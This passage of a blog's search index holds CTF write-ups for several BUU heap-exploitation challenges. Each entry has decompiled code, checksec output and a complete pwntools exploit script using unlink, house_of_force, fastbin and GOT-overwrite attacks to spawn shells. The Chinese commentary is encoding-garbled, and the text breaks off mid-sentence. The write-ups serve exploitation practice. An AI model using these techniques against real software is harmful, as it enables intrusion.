__readfsqword(0x28u); if ( num ) { printf(\"Please enter the index of item:\"); read(0, buf, 8uLL); v1 = atoi(buf); if ( *((_QWORD *)\u0026unk_6020C8 + 2 * v1) ) { printf(\"Please enter the length of item name:\"); read(0, nptr, 8uLL); v2 = atoi(nptr); printf(\"Please enter the new name of the item:\"); *(_BYTE *)(*((_QWORD *)\u0026unk_6020C8 + 2 * v1) + (int)read(0, *((void **)\u0026unk_6020C8 + 2 * v1), v2)) = 0; } else { puts(\"invaild index\"); } } else { puts(\"No item in the box\"); } return __readfsqword(0x28u) ^ v5; } delete unsigned __int64 remove_item() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); if ( num ) { printf(\"Please enter the index of item:\"); read(0, buf, 8uLL); v1 = atoi(buf); if ( *((_QWORD *)\u0026unk_6020C8 + 2 * v1) ) { free(*((void **)\u0026unk_6020C8 + 2 * v1)); *((_QWORD *)\u0026unk_6020C8 + 2 * v1) = 0LL; *((_DWORD *)\u0026itemlist + 4 * v1) = 0; puts(\"remove successful!!\"); --num; } else { puts(\"invaild index\"); } } else { puts(\"No item in the box\"); } return __readfsqword(0x28u) ^ v3; } åœ¨editæœ‰æº¢å‡ºï¼Œæœ‰ä¸€ä¸ªç®¡ç†å †å—çš„æ•°ç»„ï¼Œé¦–å…ˆæƒ³åˆ°unlinkã€‚ è¿™é‡Œè¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œåˆ©ç”¨house_of_forceã€‚åœ¨å¼€å§‹ç”³è¯·äº†ä¸€ä¸ª0x10çš„chunkï¼Œç”¨æ¥æ”¾hello_messsageå’Œgoodbye_messageå‡½æ•°çš„åœ°å€ï¼Œæˆ‘ä»¬é€šè¿‡house_of_forceå°†top chunkè¿ç§»åˆ°è¿™ä¸ªchunké™„è¿‘ï¼Œä»è€Œä¿®æ”¹å…¶ä¸­çš„å†…å®¹ã€‚ä½†æ˜¯ç”±äºbuuä¸æä¾›é¢˜ç›®é¶æœºç¯å¢ƒå¤ç°ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•åªèƒ½ç”¨æ¥ç»ƒä¹ ã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-1"},{"categories":["Writeups"],"content":"expunlink from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./bamboobox' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',27159) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') #gdb.attach(sh) def show(): sh.sendline(\"1\") def add(size,content): sh.sendline(\"2\") sh.sendafter(\"Please enter the length of item name:\",str(size)) sh.sendafter('Please enter the name of item:',str(content)) def edit(index, size, content): sh.sendline(\"3\") sh.sendlineafter('Please enter the index of item:',str(index)) sh.sendafter('Please enter the length of item name:',str(size)) sh.sendafter('Please enter the new name of the item:',str(content)) def free(index): sh.sendline('4') sh.sendlineafter('Please enter the index of item:',str(index)) array = 0x6020C8 atoi_got = elf.got['atoi'] add(0x40,'a'*0x40) #0 add(0x80,'b'*0x80) #1 add(0x40,'c'*0x40) #2 add(0x10,'/bin/sh\\x00\\x00\\x00') #4 #gdb.attach(sh) payload = p64(0)+p64(0x41)+p64(array-0x18)+p64(array-0x10) payload=payload.ljust(0x40,'n') payload+=p64(0x40)+p64(0x90) edit(0,0x80,payload) #gdb.attach(sh) free(1) payload = p64(0x40)*3+p64(atoi_got) edit(0,0x80,payload) show() atoi_addr = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) leak('atoi',atoi_addr) libc = LibcSearcher('atoi',atoi_addr) libcbase = atoi_addr-libc.dump('atoi') system = libcbase+libc.dump('system') edit(0,0x80,p64(system)) sh.sendline('/bin/sh\\x00') sh.interactive() house_of_force from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=1 binary='./bamboobox' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',27159) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') #gdb.attach(sh) def show(): sh.sendline(\"1\") def add(size,content): sh.sendline(\"2\") sh.sendafter(\"Please enter the length of item name:\",str(size)) sh.sendafter('Please enter the name of item:',str(content)) def edit(index, size, content): sh.sendline(\"3\") sh.sendlineafter('Please enter the index of item:',str(index)) sh.sendafter('Please enter the length of item name:',str(size)) sh.sendafter('Please enter the new name of the item:',str(content)) def free(index): sh.sendline('4') sh.sendlineafter('Please enter the index of item:',str(index)) array = 0x6020C8 magic = 0x400D49 atoi_got = elf.got['atoi'] add(0x30,'a'*0x30) #0 payload='a'*0x30+p64(0)+'\\xff'*8 edit(0,0x80,payload) offset = -(0x60+0x8+0xf) #gdb.attach(sh) add(offset,'a\\n')#1 add(0x10,'a\\n') edit(2,0x10,p64(magic)*2) sh.sendline('5') sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-1"},{"categories":["Writeups"],"content":"BUU-0ctf_2017_babyheap","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#buu-0ctf_2017_babyheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-2"},{"categories":["Writeups"],"content":"IDAcreate void __fastcall sub_D48(__int64 a1) { int i; // [rsp+10h] [rbp-10h] int v2; // [rsp+14h] [rbp-Ch] void *v3; // [rsp+18h] [rbp-8h] for ( i = 0; i \u003c= 15; ++i ) { if ( !*(_DWORD *)(24LL * i + a1) ) { printf(\"Size: \"); v2 = sub_138C(); if ( v2 \u003e 0 ) { if ( v2 \u003e 4096 ) v2 = 4096; v3 = calloc(v2, 1uLL); if ( !v3 ) exit(-1); *(_DWORD *)(24LL * i + a1) = 1; *(_QWORD *)(a1 + 24LL * i + 8) = v2; *(_QWORD *)(a1 + 24LL * i + 16) = v3; printf(\"Allocate Index %d\\n\", (unsigned int)i); } return; } } } fill __int64 __fastcall sub_E7F(__int64 a1) { __int64 result; // rax int v2; // [rsp+18h] [rbp-8h] int v3; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); result = sub_138C(); v2 = result; if ( (int)result \u003e= 0 \u0026\u0026 (int)result \u003c= 15 ) { result = *(unsigned int *)(24LL * (int)result + a1); if ( (_DWORD)result == 1 ) { printf(\"Size: \"); result = sub_138C(); v3 = result; if ( (int)result \u003e 0 ) { printf(\"Content: \"); result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); } } } return result; } free __int64 __fastcall sub_F50(__int64 a1) { __int64 result; // rax int v2; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); result = sub_138C(); v2 = result; if ( (int)result \u003e= 0 \u0026\u0026 (int)result \u003c= 15 ) { result = *(unsigned int *)(24LL * (int)result + a1); if ( (_DWORD)result == 1 ) { *(_DWORD *)(24LL * v2 + a1) = 0; *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL; free(*(void **)(24LL * v2 + a1 + 16)); result = 24LL * v2 + a1; *(_QWORD *)(result + 16) = 0LL; } } return result; } dump int __fastcall sub_1051(__int64 a1) { int result; // eax int v2; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); result = sub_138C(); v2 = result; if ( result \u003e= 0 \u0026\u0026 result \u003c= 15 ) { result = *(_DWORD *)(24LL * result + a1); if ( result == 1 ) { puts(\"Content: \"); sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8)); result = puts(byte_14F1); } } return result; } åœ¨fillä¸­å­˜åœ¨æº¢å‡ºï¼Œå¯ä»¥é€šè¿‡overlappingæ³„éœ²libcï¼Œå†house_of_spiritä¿®æ”¹__malloc_hookã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./0ctf_2017_babyheap' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',29355) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') #gdb.attach(sh) def add(size): sh.sendlineafter(\"Command: \",\"1\") sh.sendlineafter(\"Size: \",str(size)) def fill(index, size, content): sh.sendlineafter(\"Command: \",\"2\") sh.sendlineafter(\"Index: \",str(index)) sh.sendlineafter(\"Size: \",str(size)) sh.sendlineafter(\"Content: \",str(content)) def free(index): sh.sendlineafter(\"Command: \",\"3\") sh.sendlineafter(\"Index: \",str(index)) def show(index): sh.sendlineafter(\"Command: \",\"4\") sh.sendlineafter(\"Index: \",str(index)) #gdb.attach(sh) add(0x10) #0 add(0x80) #1 add(0x100) #2 add(0x10) #3 payload = '\\x00'*0x10+p64(0)+p64(0x1a1) fill(0,len(payload),payload) #gdb.attach(sh) free(1) add(0x190) #1 payload = '\\x00'*0x80+p64(0)+p64(0x111) fill(1,len(payload),payload) free(2) show(1) main_arena = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) malloc_hook = main_arena -88 - 0x10 fake_chunk = malloc_hook -0x23 libc_base=main_arena-88-0x3C4B20 one_gadget = libc_base + 0x4526a leak('main_arena', main_arena) leak('malloc_hook',malloc_hook) leak('fake_chunk', fake_chunk) leak('libc_base', libc_base) add(0x100) #2 add(0x60) #4 add(0x60) #5 free(4) payload = p64(0)*3+p64(0x71)+p64(fake_chunk) fill(3,len(payload),payload) add(0x60) #4 add(0x60) #6 payload = 'a'*0x13+p64(one_gadget) fill(6,len(payload),payload) add(0x10) #7 sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-2"},{"categories":["Writeups"],"content":"BUU-heapcreator","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#buu-heapcreator"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-3"},{"categories":["Writeups"],"content":"IDAcreate unsigned __int64 create_heap() { __int64 v0; // rbx int i; // [rsp+4h] [rbp-2Ch] size_t size; // [rsp+8h] [rbp-28h] char buf[8]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v5; // [rsp+18h] [rbp-18h] v5 = __readfsqword(0x28u); for ( i = 0; i \u003c= 9; ++i ) { if ( !*(\u0026heaparray + i) ) { *(\u0026heaparray + i) = malloc(0x10uLL); if ( !*(\u0026heaparray + i) ) { puts(\"Allocate Error\"); exit(1); } printf(\"Size of Heap : \"); read(0, buf, 8uLL); size = atoi(buf); v0 = (__int64)*(\u0026heaparray + i); *(_QWORD *)(v0 + 8) = malloc(size); if ( !*((_QWORD *)*(\u0026heaparray + i) + 1) ) { puts(\"Allocate Error\"); exit(2); } *(_QWORD *)*(\u0026heaparray + i) = size; printf(\"Content of heap:\"); read_input(*((_QWORD *)*(\u0026heaparray + i) + 1), size); puts(\"SuccessFul\"); return __readfsqword(0x28u) ^ v5; } } return __readfsqword(0x28u) ^ v5; } edit unsigned __int64 edit_heap() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { printf(\"Content of heap : \"); read_input(*((_QWORD *)*(\u0026heaparray + v1) + 1), *(_QWORD *)*(\u0026heaparray + v1) + 1LL); puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v3; } show unsigned __int64 show_heap() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { printf(\"Size : %ld\\nContent : %s\\n\", *(_QWORD *)*(\u0026heaparray + v1), *((const char **)*(\u0026heaparray + v1) + 1)); puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v3; } delete unsigned __int64 delete_heap() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { free(*((void **)*(\u0026heaparray + v1) + 1)); free(*(\u0026heaparray + v1)); *(\u0026heaparray + v1) = 0LL; puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v3; } crearteæ—¶ï¼Œç”³è¯·ä¸€ä¸ª0x10çš„æ§åˆ¶chunkï¼Œå­˜æ”¾ç”³è¯·chunkçš„sizeå’Œåœ°å€ã€‚ åœ¨editä¸­æœ‰ä¸€ä¸ªoff-by-oneï¼Œå¯ä»¥åˆ©ç”¨ç”¨æ¥ä¿®æ”¹æ§åˆ¶chunkï¼Œå‘å…¶sizeå†™ä¸€ä¸ªè¾ƒå¤§çš„å€¼ï¼Œfreeæ‰ã€‚è¢«æˆ‘ä»¬ä¿®æ”¹çš„æ§åˆ¶chunkåŒ…å«äº†æ­£åœ¨ä½¿ç”¨çš„chunkã€‚ä¸”ç”¨æˆ·ç”³è¯·çš„chunkåœ¨æ§åˆ¶chunkçš„ä¸Šé¢ï¼Œå¯ä»¥è¦†ç›–å…¶å†…å®¹ã€‚é€šè¿‡ä¿®æ”¹chunkæŒ‡é’ˆï¼Œleak libcå¹¶ä¿®æ”¹gotè¡¨ã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-3"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./heapcreator' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',27001) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') #gdb.attach(sh) free_got = elf.got['free'] def add(size, content): sh.sendline(\"1\") sh.sendafter(\"Size of Heap : \", str(size)) sh.sendafter(\"Content of heap:\", str(content)) def edit(index, content): sh.sendline(\"2\") sh.sendafter(\"Index :\",str(index)) sh.sendafter(\"Content of heap : \", str(content)) def show(index): sh.sendline(\"3\") sh.sendafter(\"Index :\",str(index)) def free(index): sh.sendline(\"4\") sh.sendafter(\"Index :\",str(index)) add(0x18,'a'*0x18) #0 add(0x10,'b'*0x10) #1 add(0x10,'c'*0x10) #2 add(0x10,'b'*0x10) #3 #gdb.attach(sh) edit(0, '/bin/sh\\x00'*3+'\\x81') free(1) add(0x70, p64(0)*8+p64(0x8)+p64(free_got)) #1 show(2) free_addr = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) leak('free',hex(free_addr)) libc = LibcSearcher(\"free\", free_addr) libcbase = free_addr - libc.dump(\"free\") system = libcbase + libc.dump('system') #gdb.attach(sh) edit(2,p64(system)) free(0) sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-3"},{"categories":["Writeups"],"content":"BUU-[ZJCTF2019]easyheap","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#buu-zjctf2019easyheap"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-4"},{"categories":["Writeups"],"content":"IDAcreate unsigned __int64 create_heap() { int i; // [rsp+4h] [rbp-1Ch] size_t size; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); for ( i = 0; i \u003c= 9; ++i ) { if ( !*(\u0026heaparray + i) ) { printf(\"Size of Heap : \"); read(0, buf, 8uLL); size = atoi(buf); *(\u0026heaparray + i) = malloc(size); if ( !*(\u0026heaparray + i) ) { puts(\"Allocate Error\"); exit(2); } printf(\"Content of heap:\"); read_input(*(\u0026heaparray + i), size); puts(\"SuccessFul\"); return __readfsqword(0x28u) ^ v4; } } return __readfsqword(0x28u) ^ v4; } edit unsigned __int64 edit_heap() { int v1; // [rsp+4h] [rbp-1Ch] __int64 v2; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { printf(\"Size of Heap : \"); read(0, buf, 8uLL); v2 = atoi(buf); printf(\"Content of heap : \"); read_input(*(\u0026heaparray + v1), v2); puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v4; } delete unsigned __int64 delete_heap() { int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index :\"); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 \u003c 0 || v1 \u003e 9 ) { puts(\"Out of bound!\"); _exit(0); } if ( *(\u0026heaparray + v1) ) { free(*(\u0026heaparray + v1)); *(\u0026heaparray + v1) = 0LL; puts(\"Done !\"); } else { puts(\"No such heap !\"); } return __readfsqword(0x28u) ^ v3; } ä½¿ç”¨heaparrayç»´æŠ¤äº†ä¸€ä¸ªå †æŒ‡é’ˆæ•°ç»„ï¼Œåœ¨edit_heapä¸­å¯ä»¥å†™ä»»æ„å­—èŠ‚ï¼Œæœ‰æº¢å‡ºã€‚deleteæ—¶ï¼Œå°†æŒ‡é’ˆè¿›è¡Œäº†é”€æ¯ï¼Œæ²¡æœ‰UAFã€‚ æƒ³åˆ°ä½¿ç”¨unlinkæ”¹å†™æ•°ç»„æŒ‡é’ˆã€‚ç”±äºBUUç¯å¢ƒä¸åŸé¢˜ä¸ä¸€æ ·æ‰€æœ‰æ²¡åŠæ³•ä½¿ç”¨magicç›´æ¥æ‰“å°flagï¼Œä½¿ç”¨ä¿®æ”¹gotè¡¨çš„æ–¹æ³•ã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-4"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, addr)) context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./easyheap' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',29537) elf = ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') system_plt = elf.plt[\"system\"] free_got = elf.got[\"free\"] def add(size,content): sh.sendline(\"1\") sh.sendafter('Size of Heap : ', str(size)) sh.sendafter('Content of heap:', str(content)) def edit(index, size, content): sh.sendline(\"2\") sh.sendafter(\"Index :\", str(index)) sh.sendafter('Size of Heap : ', str(size)) sh.sendafter('Content of heap : ', str(content)) def free(index): sh.sendline(\"3\") sh.sendafter(\"Index :\", str(index)) heap_arry = 0x6020E0 magic = 0x6020C0 add(0x100,'a'*0x100) #0 add(0x100,'b'*0x100) #1 add(0x10,\"/bin/sh\\x00\\x00\\x00\") #2 payload = p64(0)+p64(0x100)+p64(heap_arry-0x18)+p64(heap_arry-0x10) payload=payload.ljust(0x100,'a') payload+=p64(0x100)+p64(0x110) edit(0, 0x110, payload) free(1) #gdb.attach(sh) payload = p64(0)+p64(free_got)+p64(free_got)+p64(free_got) edit(0,len(payload),payload) payload= p64(system_plt)+p64(system_plt) edit(0,len(payload),payload) free(2) #add(0x10,'c'*0x10) sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-4"},{"categories":["Writeups"],"content":"å®‰æ’ä¸‰æœˆèµ›","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#å®‰æ’ä¸‰æœˆèµ›"},{"categories":["Writeups"],"content":"fruitpie","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#fruitpie"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-5"},{"categories":["Writeups"],"content":"IDA int __cdecl main(int argc, const char **argv, const char **envp) { _DWORD size[3]; // [rsp+4h] [rbp-1Ch] BYREF char *v5; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); init(argc, argv, envp); welcome(); puts(\"Enter the size to malloc:\"); size[0] = readInt(); v5 = (char *)malloc(size[0]); if ( !v5 ) { puts(\"Malloc Error\"); exit(0); } printf(\"%p\\n\", v5); puts(\"Offset:\"); _isoc99_scanf(\"%llx\", \u0026size[1]); puts(\"Data:\"); read(0, \u0026v5[*(_QWORD *)\u0026size[1]], 0x10uLL); malloc(0xA0uLL); close(1); return 0; } å¯ä»¥ç”³è¯·ä»»æ„å¤§å°çš„å†…å­˜ï¼Œä¹‹åchunkä¸ºåŸºå‡†å¯ä»¥å‘ä»»æ„åç§»åœ°å€å†™0x10å­—èŠ‚ã€‚ æ€è·¯æ˜¯ï¼Œç”³è¯·ä¸€ä¸ªå¾ˆå¤§çš„chunkï¼Œè®©å…¶é€šè¿‡mmapè¿›è¡Œåˆ†é…ï¼Œä»¥æ­¤è®¡ç®—libcbaseã€‚å†é€šè¿‡å‘__malloc_hookå†™one gadgetè·å¾—æƒé™ã€‚ä½¿ç”¨one_gadgetæ ˆéœ€è¦æ»¡è¶³ä¸€å®šçš„æ¡ä»¶ï¼Œæ‰€ä»¥é€šè¿‡å°†__malloc_hookè¦†ç›–ä¸ºreallocè¿›è¡Œè°ƒæ ˆã€‚ malloc ---\u003e __malloc_hook ---\u003e realloc ---\u003e __realloc_hook ---\u003e one_gadget æŸ¥çœ‹reallocçš„æ±‡ç¼–ä»£ç : .text:0000000000098CA0 ; __unwind { .text:0000000000098CA0 push r15 ; Alternative name is '__libc_realloc' .text:0000000000098CA2 push r14 .text:0000000000098CA4 push r13 .text:0000000000098CA6 push r12 .text:0000000000098CA8 push rbp .text:0000000000098CA9 push rbx .text:0000000000098CAA sub rsp, 18h .text:0000000000098CAE mov rax, cs:__realloc_hook_ptr .text:0000000000098CB5 mov rax, [rax] .text:0000000000098CB8 test rax, rax .text:0000000000098CBB jnz loc_98F50 .text:0000000000098CC1 test rsi, rsi å‘ç°å…¶æœ‰å¾ˆå¤špushï¼Œæˆ‘ä»¬å°±é€šè¿‡è¿™äº›æŒ‡ä»¤æ¥è°ƒèŠ‚æ ˆå¸§ã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-8/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#ida-5"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=1 binary='./pwn' #gdb.attach(sh) if local: sh=process(binary) else: sh=remote('node3.buuoj.cn',27982) elf = ELF(binary,checksec=False) libc = ELF('./libc.so.6') one_gadget=[0x4f365,0x4f3c2,0x10a45c] sh.sendafter('Enter the size to malloc:', str(99999999)) sh.recvuntil('0x') addr = int(sh.recv(12),16) leak('chunk',hex(addr)) libc_base=addr+0x5f5eff0 leak('libc base',hex(libc_base)) one=libc_base+one_gadget[1] realloc=libc_base+libc.sym['realloc'] #gdb.attach(sh) offset=libc.sym[\"__malloc_hook\"]+0x5f5eff0 leak('offset',hex(offset)) sh.sendlineafter('Offset:',hex(offset)) sh.sendafter('Data:',p64(one)+p64(realloc+0x4)) sh.interactive() å­¦ä¹ åˆ°é€šè¿‡mmapçš„å†…å­˜æ¥æ³„éœ²libcï¼Œé€šè¿‡reallocè¿›è¡Œè°ƒæ ˆã€‚ ","date":"2021-04-18","objectID":"/challenges-100-week-8/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#exp-5"},{"categories":["Writeups"],"content":"sort_it","date":"2021-04-18","objectID":"/challenges-100-week-8/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#sort_it"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2021-04-18","objectID":"/challenges-100-week-8/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 8","uri":"/challenges-100-week-8/#checksec-6"},{"categories":["Writeups"],"content":"IDA int __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rdi __int64 v4; // rdx __int64 v5; // rsi __int64 v6; // rdx char v8; // [rsp+Fh] [rbp-71h] __int64 v9; // [rsp+10h] [rbp-70h] BYREF __int64 v10; // [rsp+18h] [rbp-68h] BYREF __int64 v11[12]; // [rsp+20h] [rbp-60h] BYREF v11[11] = __readfsqword(0x28u); v8 = 0; v11[0] = 'egnaro'; v11[1] = 'eton'; v11[2] = 'elppa'; v11[3] = 'puc'; v11[4] = 'daerb'; v11[5] = 'arbez'; v11[6] = 'dnah'; v11[7] = 'naf'; v11[8] = 'noil'; v11[9] = 'licnep'; clear(argc, argv, envp); puts(\"Sort the following words in alphabetical order.\\n\"); print_words(v11); v3 = \"Press any key to continue...\"; printf(\"Press any key to continue...\"); getchar(); while ( v8 != 1 ) { clear(v3, argv, v4); print_words(v11); printf(\"Enter the number for the word you want to select: \"); __isoc99_scanf(\"%llu\", \u0026v9); getchar(); --v9; printf(\"Enter the number for the word you want to replace it with: \"); __isoc99_scanf(\"%llu\", \u0026v10); getchar(); --v10; v5 = v9; swap(v11, v9, v10); clear(v11, v5, v6); print_words(v11); printf(\"Are the words sorted? [y/n]: \"); argv = (const char **)(\u0026word_10 + 1); v3 = \u0026yn; fgets(\u0026yn, 0x11, stdin); if ( yn != 'n' ) { if ( yn != 'y' ) { puts(\"Invalid choice\"); getchar(); exit(0); } v8 = 1; } } if ( (unsigned int)check((__int64)v11) ) { puts(\"You lose!\"); exit(0); } puts(\"You win!!!!!\"); return 0; } å¯¹æ•°ç»„ä¸­çš„å…ƒç´ è¿›è¡Œæ’åºï¼Œå¯ä»¥äº¤æ¢ä»»æ„ä¸¤ä¸ªå…ƒç´ ï¼Œè¿™é‡Œå­˜åœ¨æ˜æ˜¾çš„æ•°ç»„è¶…ç•Œã€‚é€šè¿‡æ•°ç»„è¶…ç•Œæ³„éœ²ä»£ç æ®µåŸºå€ï¼ŒlibcåŸºå€å’Œæ ˆåœ°å€ã€‚ åœ¨å‡½æ•°ä¸­æ²¡æœ‰æ ˆæº¢å‡ºå¯ä»¥åˆ©ç”¨ï¼Œä½†æ˜¯fgets(\u0026yn, 0x11, 